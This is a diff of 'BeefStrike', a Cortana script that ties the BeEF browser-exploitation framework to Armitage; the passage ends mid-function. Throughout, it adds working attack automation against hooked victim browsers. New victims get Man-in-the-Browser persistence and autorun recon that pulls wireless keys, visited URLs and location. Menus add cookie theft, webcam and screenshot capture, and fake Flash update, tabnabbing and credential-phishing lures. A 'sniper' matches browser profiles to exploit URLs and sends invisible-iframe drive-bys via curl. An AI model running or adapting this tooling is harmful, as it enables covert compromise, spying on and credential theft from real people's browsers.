@@ -1,16 +1,16 @@
 ############################ WARNING !!!##################################################
-##																 				        ##
-##		Before beginning to use this script, change all the 					        ##									 															  
-##	"import" lines ... Obviously you must put the right path for each Library. 			##
-##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"		##$*
-##																						##
+##										        ##
+##		Before beginning to use this script, change all the 			##									 															  
+##	"import" lines ... Obviously you must put the right path for each Library. 	##
+##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"	##
+##											##
 ##  BeefStrike is a script for Beef and Armitage integration. May be you must read the  ##
-##		README file and watch Youtube video demo before use it  						##
-##															 						    ##	
-##																						##	
-##                  >   by Beny Green    <												##
-##			       [  aka @TheBenyGreen	  ]												##												 						    ##				 				
-##	 			 																		##													 																  
+##		README file and watch Youtube video demo before use it  		##
+##											##	
+##											##	
+##                  >   by Beny Green    <						##
+##		 [  aka @TheBenyGreen	  ]			                        ##				 				
+##	 			 							##													 																  
 ##########################################################################################
 import com.eyesopencrew.* from: C:\BeefLib\dist\BeefLib.jar;
 import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-lang-2.5.jar;
@@ -36,7 +36,7 @@ $size_on = 0; $size_off = 0;
 @browser_profile_list = @(%());
 #@targets = @(%());
 #@beef_autorun = @(%());
-$assault_mode = 0;
+$assault_mode = 1;
 $targets_id = 0 ;
 $id_analyz = 0;
 $id_beef_autorun = 0 ;
@@ -44,7 +44,7 @@ $id_beef_autorun = 0 ;
 on ready {
 	$console = console();
 	$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
-	cmd($console , " \c8 Using beefmetasploitplugin is no longer a need for BeefStrike. But we always take care for some users accomodance.");
+	cmd($console , " \c8 Using beefmetasploitplugin is no longer a need for BeefStrike. But we always take care for some users usage.");
 	cmd($console , "load beef");
 	say("Beef_Strike is running");
 	}
@@ -57,9 +57,6 @@ popup attacks {
 	menu "BeEF Strike"{
 		menu "Start" {
 			item "Connect" {
-		# Default value of Auto-import & Client-side auto-recon.
-			#$import = 0;
-			#$recon = 1;
 			cmd($console , "beef_disconnect");
 			$beefUrl = prompt_text("BeEF Server (with http://). Don't use loopback","http://192.168.1.22:4000");
 			$user = prompt_text("User","beef");
@@ -71,7 +68,8 @@ popup attacks {
 			}
 			item " Key" {
 				$key = prompt_text("Copy and Paste RESTful_API_Key here","$key");
-					if ($key ne "00000000000000000000000" ){ 
+					if ($key ne "00000000000000000000000" ){ 	
+					fill(); sleep(1000);
 					show_message("Well done, now wait for new zombie.");
 					}else{show_message("Your key cannot be the default 0000000000000000 ");}
 				println("Here is the REST_ful API Key: $key ");
@@ -140,14 +138,19 @@ popup zmb_hook {
 			zombi_info($idr);
 			}
 		menu "Recon." {
-			item "Port scan" { #4
-				$cmde_param = prompt_text("Ports to scan (exemple:)","\"ipHost\":\"$adr\",\"ports\"=\"80,445,22,21\"");
-				send_beefcmd_with_param($sessidr, 4, $cmde_param, 0);
+			item "Port scan" { 
+				$cmde_param = prompt_text("Ports to scan (example:)","\"ipHost\":\"$adr\",\"\":\"\",\"\":\"\",\"ports\"=\"80,445,22,21\"");
+				send_beefcmd_with_param($sessidr, $code_portscan, $cmde_param, 0);
 			}
-			item "Check cmd result" {
-			#check_beef_cmd_result($sessidr, $idcmde);
-			#recon_result($idr);
-			}
+			item "Ping Sweep" { 
+				send_beefcmd_with_param($sessidr, $code_pingjav, "", 1);
+				}
+			item "DNS Enumeration" { 
+				send_beefcmd_with_param($sessidr, $code_dnsenum, "", 1);
+				}
+			item "Fingerprint Network" { 
+				send_beefcmd_with_param($sessidr, $code_fingnetwork, "", 1);
+				}
 			}
 		menu "Attack" {
 			item "Drive-by" { 
@@ -157,27 +160,26 @@ popup zmb_hook {
 				append($console , "Send invisible iframe : " . $inviframe . " --> " . $sessidr . "" );
 				run_driveby($beefUrl, $sessidr, $key, $inviframe);
 				}
-			item "Raw JS" {#23
-				$cmde_param = prompt_text("JS code (here is the exemple to follow)","\"cmd\":\"alert('WTF');\"");
-				send_beefcmd_with_param($sessidr, 23, $cmde_param, 0);
+			item "Raw JS" {
+				$cmde_param = prompt_text("JS code (here is the example to follow)","\"cmd\":\"alert('WTF');\"");
+				send_beefcmd_with_param($sessidr, $code_rawjs, $cmde_param, 0);
 				} 		
 	 		}
 		menu "Special" {
-			item "Get_cookie" {	#17
-				append($console , "Get all cookies of > " . $adr . "" );
-				send_beef_cmd_without_param($sessidr, 17);
-				#check_beef_cmd_result($sessidr, 17);
+			item "Get_cookie" {	
+				send_beef_cmd_without_param($sessidr, $code_getcookie);
 				}
-			item "Screenshot" {#103
-				append($console , "Screenshot of > " . $adr . "" );
-				send_beefcmd_with_param($sessidr, 103,"", 0);
-				#check_beef_cmd_result($sessidr, 103);
+			item "Screenshot" {
+				send_beefcmd_with_param($sessidr, $code_screenshot,"", 1);
+				}
+			item "Webcam" {
+				send_beefcmd_with_param($sessidr, $code_webcam,"", 1);
 				}
 			#menu "Geolocation" { #110
 			#		local ('$maptype $json_freegeoip');
 			#		item "Satellite type" {
 			#		append($console , "Geolocate > " . $adr . "" );
-			#		send_beef_cmd_without_param($sessidr, 110);
+			#		send_beef_cmd_without_param($sessidr, $code_geoloc);
 					#check_beef_cmd_result($sessidr, 110);
 			#		$freegeoip_url = "http://freegeoip.net/json/" . $adr . "";
 			#		$maptype = "satellite";
@@ -199,15 +201,25 @@ popup zmb_hook {
 				append($console , "Send Command ID to >>>" . $adr . "" );
 				$idcmde = prompt_text("Command ID","27");
 				send_beefcmd_with_param($sessidr, $idcmde, "", 1);
-				
-				#$capt = check_beef_cmd_result($sessidr, $idcmde);
-				#%result = %(command_ID => $idcmde, sessionID => "$session", result => "$capt");
-				#@beef_result[$idcmde] = %result;
 				}
 			}
+		menu "Social Eng." {
+			item "Clickjacking" {	
+				send_beefcmd_with_param($sessidr, $code_clickjak,"", 1);
+				}
+			item "TabNabbing" {	
+				send_beefcmd_with_param($sessidr, $code_tabnabbing,"", 1);
+				}
+			item "Fake flash update" {	
+				send_beefcmd_with_param($sessidr, $code_fakeflash,"", 1);
+				}
+			item "Pretty thief" {	
+				send_beefcmd_with_param($sessidr, $code_theft,"", 1);
+				}
+		}
 		item "Unhook" {
 				append($console , "Unhook : " . $idr . " -> pushed out off the horde" );
-				send_beef_cmd_without_param($sessidr, 105);
+				send_beef_cmd_without_param($sessidr, $code_unhook);
 		}
 	}	
 # This function send beEF command without param !
@@ -252,7 +264,6 @@ sub refresh_hosts {
 sub refresh_hostsoff {
 	table_set($1, @beef_hostsoff);
 }
-
 sub refresh_result {
 	table_set($1, @beef_result);
 }
@@ -272,7 +283,7 @@ on tab_table_click {
 	}
 	if ($3 eq "See autorun list") {
 		local('$beef_autorun');
-		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds"), "sniper_hook", 1);
+		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds", "Replay"), "sniper_hook", 1);
 		refresh_list($beef_autorun);
 		}
 	if ($3 eq "More details") {
@@ -317,19 +328,32 @@ on tab_table_click {
 	if ($3 eq "Refresh details") {
 		refresh_details($1);
 	}
+	if ($3 eq "Replay") {
+		show_message("Autorun keep track of zombies already parsed. \n This action clear that track so that autorun can be replay");
+		clear(@autorundisabled);
+	}
 }
 
 # So what append when we have a new zombie ?
-on zombies_news { println("who is here"); println($1); 
-	if ( $1 = 0){$b = $1; } else { $b = $1 - 1 ;} println("who is After ops"); println($1);
-	#$b = $1 - 1 ; # magic ops to retrieve good Id ... :-)
-	host_add(@beef_hosts[$b]["ip"]); 
-	# Build and store browser's profile of the new zombie
-	$sid = @beef_hosts[$b]["sessionID"];
-	append($console, "\c9 [+] Send MiTB module for Persistence.");	
-	send_beefcmd_with_param($sid, 32, "", 0); # MITB Persistence
-	host_os(@beef_hosts[$b]["ip"],@beef_hosts[$b]["OS"]);
-	$link = "" . $beefUrl . "/api/hooks/" . $sid . "?token=" . $key . "";
+on zombies_news { 
+	$b = $size_on - 1 ; # magic ops to retrieve good Id ... :-)
+	$c = $2 - $1;
+	if ($c == 1){ build_profile($b);}
+	else{ 
+		for ($i = $prevnum; $i < $newnum; $i++) {
+			build_profile($i);
+			}
+		}
+	build_profile($b);
+}
+# Build and store browser's profile of the new zombie
+sub build_profile {
+		host_add(@beef_hosts[$1]["ip"]);
+		$sid = @beef_hosts[$1]["sessionID"];
+		append($console, "\c9 [+] Send MiTB module for Persistence.");	
+		send_beefcmd_with_param($sid, $code_mitb, "", 0); # MITB Persistence #
+		host_os(@beef_hosts[$1]["ip"],@beef_hosts[$1]["OS"]);
+		$link = "" . $beefUrl . "/api/hooks/" . $sid . "?token=" . $key . "";
 		$details = [BeefRequester BeefGetRequest: "$link"];#sleep(100);
 		$js = [new JSONObject];
 		$js = [JSONSerializer toJSON: "$details"];
@@ -347,12 +371,12 @@ on zombies_news { println("who is here"); println($1);
 		$OsName = [[$js get: "OsName"] toString];#used by sniper
 		$SystemPlatform = [[$js get: "SystemPlatform"] toString];#used by sniper
 		$VBScriptEnabled = [[$js get: "VBScriptEnabled"] toString];#used by sniper
-		%browser_profile = %(id => "$b", sessionID => "$sid", Browser => "$BrowserName", ReportedName => "$BrowserReportedName", Type => "$BrowserType", Version => "$BrowserVersion", OS => "$OsName", Platform => "$SystemPlatform", ActiveX => "$HasActiveX", Flash => "$HasFlash", Java => "$JavaEnabled", VBScript => "$VBScriptEnabled", Plugins => "$BrowserPlugins", GoogleGears => "$HasGoogleGears", WebSocket => "$HasWebSocket", HostName => "$HostName" );
-	@browser_profile_list[$b] = %browser_profile;
-	#fire_event("analyze_target", $b);
-	fire_event("play_autorun_cmd", $b);
-
-	}
+		%browser_profile = %(id => "$1", sessionID => "$sid", Browser => "$BrowserName", ReportedName => "$BrowserReportedName", Type => "$BrowserType", Version => "$BrowserVersion", OS => "$OsName", Platform => "$SystemPlatform", ActiveX => "$HasActiveX", Flash => "$HasFlash", Java => "$JavaEnabled", VBScript => "$VBScriptEnabled", Plugins => "$BrowserPlugins", GoogleGears => "$HasGoogleGears", WebSocket => "$HasWebSocket", HostName => "$HostName" );
+		@browser_profile_list[$1] = %browser_profile;
+		elog("Beef browser profiling - Informations about this zombie - \n BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");
+	#	fire_event("analyze_target", $1);
+	fire_event("play_autorun_cmd", $1);
+}
 
 on analyze_target {
 	match_it($1);}
@@ -362,6 +386,7 @@ on play_autorun_cmd {
 
 # This action try to keep your zombie list up to date inside Armitage
 sub zombiupdate {
+  if ($key ne "00000000000000000000000" ){ 
   $hooks_list_link = "" . $beefUrl . "/api/hooks?token=" . $key . "";
   $jsonTxt = [BeefRequester BeefGetRequest: "$hooks_list_link"];sleep(100);
 #JSON Processing ---- ONLINE ZOMBIES -----* * *------------------	
@@ -410,27 +435,21 @@ sub zombiupdate {
 		$prevnum = $zombieNumMonitor ;
 		$zombieNumMonitor = $size_on ;
 		$newnum = $zombieNumMonitor ; 
-		#$i = $prevnum;
-		#while ( $i < $newnum)   
-		for ($i = $prevnum; $i < $newnum; $i++) {
-			println("--i---");println($i);
-			fire_event("zombies_news", $i);
-			#$i++
-			#sleep(100);
-			}
+		fire_event("zombies_news", $prevnum, $newnum);
 		} 
 	if ($zombieNumMonitor > $size_on){
 		append($console, "\c4 [-] Some zombies have leave the horde");
 		println("\c4 [-] Some zombies have leave the horde");
 		say("Some zombies have leave the horde");
 		$zombieNumMonitor = $size_on ;
-		} 
+		}
+	} else { append($console, "\c4[!]No Key available");}
 }
 
 #################################### GIVE ME MY SHELL ! ###########################
 # I love this action, it send invisible iframe to your target so easily that you can play with client-side exploit like you do with remote exploit. :-D awesome !
 sub run_driveby {
-	$link = "" . $1 . "/api/modules/" . $2 . "/27?token=$3";
+	$link = "" . $1 . "/api/modules/" . $2 . "/" . $code_inviframe . "?token=$3";
 	$attak = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"target\":\"" . $4 . "\"}' -X POST " . $link . "";
 	cmd($console , "$attak");
 	say("Send invisible iFrame: " . $4 . " via Beef_Strike ");
@@ -452,25 +471,27 @@ sub zombi_info {
    $SystemPlatform = @browser_profile_list[$1]["Platform"] ;
    $VBScriptEnabled = @browser_profile_list[$1]["VBScript"];
    show_message( "BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");
-}
+   append($console ,"\c8 ZOMBIE INFOS \n BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");
+
+   }
 
 ###################   JSON Processing ---- BEEF COMMANDS ---- #####################
 sub fill_cmde_tab {
-	fill();
-	sleep(50);
+	sleep(1000);
 	table_set($1, @beef_cmde);
 	}
 
 sub cmde_info {
 	$link2 = "" . $beefUrl . "/api/modules/" . $1 . "?token=" . $key . "";
-	$cmdeid = [BeefRequester BeefGetRequest: "$link2"];sleep(1000);
+	$cmdeid = [BeefRequester BeefGetRequest: "$link2"]; sleep(100);
 	$jsoncmdeinfo = [new JSONObject];
 	$jsoncmdeinfo = [JSONSerializer toJSON: "$cmdeid"];
-   $name = [[$jsoncmdeinfo get: "name"] toString];
-   $description = [[$jsoncmdeinfo get: "description"] toString];
-   $options = [[$jsoncmdeinfo get: "options"] toString];
-   	show_message( "Name: " . $name . "\n +---------------------------------------------+\n Description: " . $description . "\n Options: " . $options . "\n +-------------------------------------------+");
-	}
+    $name = [[$jsoncmdeinfo get: "name"] toString];
+    $description = [[$jsoncmdeinfo get: "description"] toString];
+    $options = [[$jsoncmdeinfo get: "options"] toString];
+    show_message( "Name: " . $name . "\n +---------------------------------------------+\n Description: " . $description . "\n Options: " . $options . "\n +-------------------------------------------+");
+    append($console , " \c8 COMMANDE INFOS \n Name: " . $name . "\n +---------------------------------------------+\n Description: " . $description . "\n Options: " . $options . "\n +-------------------------------------------+");
+}
 
 sub fill {
 	$cmd_list_link = "" . $beefUrl . "/api/modules?token=" . $key . "";
@@ -481,8 +502,37 @@ sub fill {
 		$name = [CommandList extractcmdData: $jsonTxt_cmde, $i, "name"];  
 		$category = [CommandList extractcmdData: $jsonTxt_cmde, $i, "category"]; 
 		%cmde = %(id => "$id", name => "$name", category => "$category");
-		@beef_cmde[$i] = %cmde;	
-	}
+		@beef_cmde[$i] = %cmde;
+		#PERSISTENCE
+		if ( $name eq "Man-In-The-Browser") { $code_mitb = $id;}
+		if ( $name eq "Unhook") { $code_unhook = $id;}
+		# RECON
+		if ( $name eq "Port Scanner") { $code_portscan = $id;}
+		if ( $name eq "DNS Enumeration") { $code_dnsenum = $id;}
+		if ( $name eq "Fingerprint Network") { $code_fingnetwork = $id;}
+		if ( $name eq "Fingerprint Browser") { $code_fingbrowser = $id;}
+		if ( $name eq "Get Internal IP") { $code_ipnat = $id;}
+		if ( $name eq "Get System Info") { $code_sysinfo = $id;}
+		if ( $name eq "Get Wireless Keys") { $code_wireless = $id;}
+		if ( $name eq "Replace HREFs (HTTPS)") { $code_replacehttps = $id;}
+		if ( $name eq "Ping Sweep (Java)") { $code_pingjav = $id;}
+		if ( $name eq "Get Visited URLs") { $code_visitedurl = $id;}
+		if ( $name eq "Dectect Software") { $code_detectsoft = $id;}
+		if ( $name eq "Get Visited Domains") { $code_visitedomain = $id;}
+		#ATTACK
+		if ( $name eq "Create Invisible Iframe") { $code_inviframe = $id;}
+		if ( $name eq "Raw JavasScript") { $code_rawjs = $id;}
+		#SPECIAL
+		if ( $name eq "Get Cookie") { $code_getcookie = $id;}
+		if ( $name eq "Spyder Eye") { $code_screenshot = $id;}
+		if ( $name eq "Get Geolocation") { $code_geoloc = $id;}
+		if ( $name eq "Webcam") { $code_webcam = $id;}
+		#SOCIAL ENG
+		if ( $name eq "Fake Flash Update") { $code_fakeflash = $id;}
+		if ( $name eq "Clickjacking") { $code_clickjak = $id;}
+		if ( $name eq "TabNabbing") { $code_tabnabbing = $id;}
+		if ( $name eq "Pretty Theft") { $code_theft = $id;}
+		}
 }
 popup sniper_hook {
 			@ccr = flatten(table_selected($1, "id"));
@@ -620,7 +670,7 @@ on tab_image_click {
  
 popup attacks {
 	menu "Browser Sniper"{
-		#append($console , "\cB[*] Browser Sniper is an Open Web Drive-by Center" );
+
 	item "Commands" {
 			local('$commandtab');
 			$commandtab = open_table_tab("Commands", "", @("id","name","category"), @(), @("Fill it", "See autorun list"), "cmde_hook", 1);
@@ -629,13 +679,13 @@ popup attacks {
 	
 	item "Autorun list" {
 		local('$beef_autorun');
-		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds"), "sniper_hook", 1);
+		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds", "Replay"), "sniper_hook", 1);
 		refresh_list($beef_autorun);
 		}
 		
 	# item "Web Drive-by Config" {
 	#	local('$sniper');
-	#	$sniper = open_table_tab("Web Drive-by", "", @("id", "Browser", "Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "Attack_URL"), @(), @("Edit", "Refresh profiles","Add", "Delete"), "sniper_hook", 1);
+	#	$sniper = open_table_tab("Web Drive-by", "", @("id", "Browser", "Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "Attack_URL"), @(), @("Add", "Refresh profiles","Edit", "Delete"), "sniper_hook", 1);
 	#	refresh_profiles($sniper);
 	#	}
 	#item "Line of Sight(+) " {
@@ -646,16 +696,11 @@ popup attacks {
 	#menu "Assault mode" {
 	#	item "Active" {   
 	#			append($console, "\cC [*] Sniper is in assault mode");
-	#			show_message(" [Browser Sniper ===--|_|-\_;=)  ] -  \n Intelligent URL Distribution is ACTIVE (Web drive-by) \n -------------------------- \n This functionnality improve the way pentesters work with Client-side exploits when they choose Armitage or Cobalt Strike.\n"); 
 	#			$assault = 1 ;
 	#			}
 	#	item "Stand-by" {  
 	#			append($console, "\c4 [-]  Sniper is in stand-by. \n this mode is usefull only if you want to send attack_URL manualy so that you control each attempt");
 	#			$assault = 0 ;
-	#	        }
-	#	item "Shot all" {  
-	#			append($console, "\cC [*] Send All the attack_URL \n Normaly you don't need to do this action if your sniper is already in active mode");
-	#			snipershot_all();
 	#	        }
 	#	}
 	}
@@ -678,24 +723,33 @@ sub refresh_details {
 sub load_clientside_recon_mod {
 			show_message("\c9 [+] Client-side Recon. modules loaded");
 			if ( $recon == 0 ) { 
-			%cmd0 = %(cc => "$id_beef_autorun", id => "102", name => "fingerprint browser", category => "client-side Recon", browser => "All", Param => "All");
-			%cmd1 = %(cc => "$id_beef_autorun", id => "95", name => "replace https hrefs by http", category => "client-side Recon", browser => "All", Param => "");
-			%cmd2 = %(cc => "$id_beef_autorun", id => "79", name => "get visited domains", category => "client-side Recon", browser => "All", Param => "");
-			%cmd3 = %(cc => "$id_beef_autorun", id => "80", name => "get visited URLs", category => "client-side Recon", browser => "All", Param => "");
-			%cmd4 = %(cc => "$id_beef_autorun", id => "107", name => "get Wireless keys", category => "client-side Recon", browser => "All", Param => "");
-			%cmd5 = %(cc => "$id_beef_autorun", id => "110", name => "get location using location API", category => "client-side Recon", browser => "All", Param => "");
-			%cmd6 = %(cc => "$id_beef_autorun", id => "117", name => "get internal IP (behind NAT)", category => "client-side Recon", browser => "All", Param => "");
-			%cmd7 = %(cc => "$id_beef_autorun", id => "112", name => "get system information", category => "client-side Recon", browser => "All", Param => "");
-			%cmd8 = %(cc => "$id_beef_autorun", id => "115", name => "detect installed software (IE only)", category => "client-side Recon", browser => "IE", Param => "");
+			%cmd0 = %(cc => "$id_beef_autorun", id => "$code_fingbrowser", name => "fingerprint browser", category => "client-side Recon", browser => "All", Param => "");
 			@beef_autorun[$id_beef_autorun] = %cmd0; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd1 = %(cc => "$id_beef_autorun", id => "$code_replacehttps", name => "replace https hrefs by http", category => "client-side Recon", browser => "All", Param => "");
 			@beef_autorun[$id_beef_autorun] = %cmd1; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd2 = %(cc => "$id_beef_autorun", id => "$code_visitedomain", name => "get visited domains", category => "client-side Recon", browser => "All", Param => "");
 			@beef_autorun[$id_beef_autorun] = %cmd2; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd3 = %(cc => "$id_beef_autorun", id => "$code_visitedurl", name => "get visited URLs", category => "client-side Recon", browser => "All", Param => "");
 			@beef_autorun[$id_beef_autorun] = %cmd3; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd4 = %(cc => "$id_beef_autorun", id => "$code_wireless", name => "get Wireless keys", category => "client-side Recon", browser => "All", Param => "");
 			@beef_autorun[$id_beef_autorun] = %cmd4; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd5 = %(cc => "$id_beef_autorun", id => "$code_geoloc", name => "get Geolocation", category => "client-side Recon", browser => "All", Param => "");
 			@beef_autorun[$id_beef_autorun] = %cmd5; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd6 = %(cc => "$id_beef_autorun", id => "$code_ipnat", name => "get internal IP (behind NAT)", category => "client-side Recon", browser => "All", Param => "");
 			@beef_autorun[$id_beef_autorun] = %cmd6; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd7 = %(cc => "$id_beef_autorun", id => "$code_sysinfo", name => "get system information", category => "client-side Recon", browser => "All", Param => "");
 			@beef_autorun[$id_beef_autorun] = %cmd7; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd8 = %(cc => "$id_beef_autorun", id => "$code_detectsoft", name => "detect installed software (IE only)", category => "client-side Recon", browser => "IE", Param => "");
 			@beef_autorun[$id_beef_autorun] = %cmd8; $id_beef_autorun = $id_beef_autorun + 1 ;
+						
 			say("BeEF system profiling modules have been loaded. Check autorun command list");
 			$recon = 1 ;
 			}	
@@ -742,7 +796,7 @@ sub edit_profiles {
 	$vbs_dr = prompt_text("VBScript","$vbs_dr");
 	$plugins_dr = prompt_text("Plugins ","$plg_dr");
 	$url_dr = prompt_text("URL of the attack to map with this profile","$urlb_dr");
-	%host_dr = %(id => $targets_id, Browser => "$browser_dr", Version => "$version_dr", OS => "$os_dr", Platform => "$platform_dr", ActiveX => "$activex_dr", Flash => "$flash_dr", Java => "$java_dr", VBScript => "$vbs_dr", Plugins => "$plugins_dr" , Attack_URL => "$url_dr");
+	%host_dr = %(id => $id_dr, Browser => "$browser_dr", Version => "$version_dr", OS => "$os_dr", Platform => "$platform_dr", ActiveX => "$activex_dr", Flash => "$flash_dr", Java => "$java_dr", VBScript => "$vbs_dr", Plugins => "$plugins_dr" , Attack_URL => "$url_dr");
 	@targets[$id_dr] = %host_dr;
 	refresh_profiles($1);
 	}
@@ -798,7 +852,8 @@ sub changeurl {
 ###- intelligence analysis -####
 sub match_it {
 #### STEP 1  -  extracted informations about a particular zombie.
-   if ($key ne "00000000000000000000000" ){  
+	local('$match');
+    if ($key ne "00000000000000000000000" ){  
 	$BrowserName = @browser_profile_list[$1]["Browser"] ;
 	$BrowserPlugins = @browser_profile_list[$1]["Plugins"] ;
 	$BrowserReportedName = @browser_profile_list[$1]["ReportedName"] ;
@@ -815,23 +870,30 @@ sub match_it {
 	$VBScriptEnabled = @browser_profile_list[$1]["VBScript"];
 	$sip = @beef_hosts[$1]["ip"];
 	$sid = @beef_hosts[$1]["sessionID"];
-	println($sid);
+	println("valeur sessID en cours d'analyse"); println($sid);
 	%extracted = %(id => "$1", sessionID => "$sid", Browser => "$BrowserName", ReportedName => "$BrowserReportedName", Type => "$BrowserType", Version => "$BrowserVersion", OS => "$OsName", Platform => "$SystemPlatform", ActiveX => "$HasActiveX", Flash => "$HasFlash", Java => "$JavaEnabled", VBScript => "$VBScriptEnabled", Plugins => "$BrowserPlugins", GoogleGears => "$HasGoogleGears", WebSocket => "$HasWebSocket", HostName => "$HostName" );
 	
 #### STEP 2  -  Try to find profiles matching with zombies's informations
 		foreach $index => $value (@targets){
 			%profile = $value;
-			foreach $index2 => $value2 (%profile){
-				if ( $value2 eq "*" || "" || " "){
-				$match = 1; continue;}
-				$match_regex = "(.*|\\s) $+ $value2 $+ (\\s|.*)" ;
-				if ( %extracted["$index2"] ismatch $match_regex){println("" . %extracted["$index2"] . "  > matchUP!!!" . $value2 . "");
-				$match = 1;continue;}else{println("" . %extracted["$index2"] . "  > matchDOWN!!!" . $value2 . ""); $match = 0; break;}
+			println("valeur browser extraite du profile pour test"); println(%profile["Browser"]);
+			
+			foreach $index2 => $value2 (%profile){  
+				println("valeur extraite du profile en cours de Machage "); println($value2);
+				#if ( $value2 eq "*" || "" || " "){
+				#$match = 1; continue; println("valeur retenu pour match"); println($match);}
+				#else {
+				$match_regex = "(.*|\\s) $+ $value2 $+ (\\s|.*)" ; println("match regex en application"); println($match_regex);
+				println("valeur du zombie en cours d'analyse"); println(%extracted["$index2"]);
+				if ( %extracted["$index2"] ismatch $match_regex ){println("" . %extracted["$index2"] . "  > matchUP!!!" . $value2 . "");
+				$match = 1;continue;}
+				else{println("" . %extracted["$index2"] . "  > matchDOWN!!!" . $value2 . ""); $match = 0; break;}
+				#}
 			}
 			if ($match == 1){
 #### STEP 3  -  Zombies maps each with a client-side exploit well suited if we found one.				
 			$inviframe = %profile["Attack_URL"];
-			%analyz_dr = %(id => "$1", ip => "$sip", sessionID => "$sid" , Attack_URL => "$inviframe");
+			%analyz_dr = %(id => "$id_analyz", ip => "$sip", sessionID => "$sid" , Attack_URL => "$inviframe");
 			@analyze["$id_analyz"] = %analyz_dr;
 			$id_analyz = $id_analyz + 1 ;
 			append($console , "Sniper has found a target that match with one of your defined profiles " )
@@ -847,25 +909,23 @@ sub match_it {
 		} fire_event("play_autorun_cmd", $1);
 	}
 	else
-	{ println("\c4[-]No Key available") ;}
+	{ println("\c4[!]No Key available") ;}
 }
 
 # This action tell sniper to shot now all targets which appear on the line of sigh.
 # No, this is not a FPS game. 
 sub snipershot_all {
-	#local('$inviframe $sid');
 	if (size(@analyze) != 0) {
-	for ($i = 0; $i <= size(@analyze); $i++)   {
+	for ($i = 0; $i < size(@analyze); $i++)   {
 			$sid = @analyze[$i]["sessionID"] ;
 			$inviframe = @analyze[$i]["Attack_URL"] ;
 			run_driveby($beefUrl, $sid, $key, $inviframe);
-			append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " >>> " . $sid . "" );
+			append($console , "\c9[*] Sniper send attack " . $inviframe . " >>> " . $sid . "" );
 			} 
-		} else {println("No profiles/zombies association found !")}
+		} else {println("No profiles-zombies association found !")}
 }
-# This action send a particular client-side exploit (drive-by) again a target selected by our Sniper.
+# This action send attack_URL (drive-by) agains to a target selected by our Sniper.
 sub snipershot {
-	#local('$inviframe $sessid_dr');
 	@sessid = flatten(table_selected($1, "sessionID"));
 	@urlattack = flatten(table_selected($1, "Attack_URL"));
 	$sessid_dr = @sessid[0];
@@ -874,18 +934,23 @@ sub snipershot {
 	append($console , "\c9[*] Sniper send attack " . $inviframe . " >>> " . $sessid_dr . "" );
 }
 # This action execute each commands added to the beef's autorun list once a new zombie appear	
+@autorundisabled = @();
 sub beef_autorun {
+	local('$go');
 	$lim = size(@beef_autorun);
 	if ( $size_on != 0 && $lim != 0  ) {
-	$browser = @beef_hosts[$1]["name"];
-	$sesside = @beef_hosts[$1]["sessionID"];
-	 	for ($i = 0; $i < $lim; $i++)   {
-			if ( $browser eq @beef_autorun[$i]["browser"]){
+		$browser = @beef_hosts[$1]["name"];
+		$sesside = @beef_hosts[$1]["sessionID"];
+	 	foreach $index => $sessvalue (@autorundisabled)  {
+			if ( $sesside ne $sessvalue){ $go = 0; } else { $go = 1; break;} }
+				if ( $go == 0) {
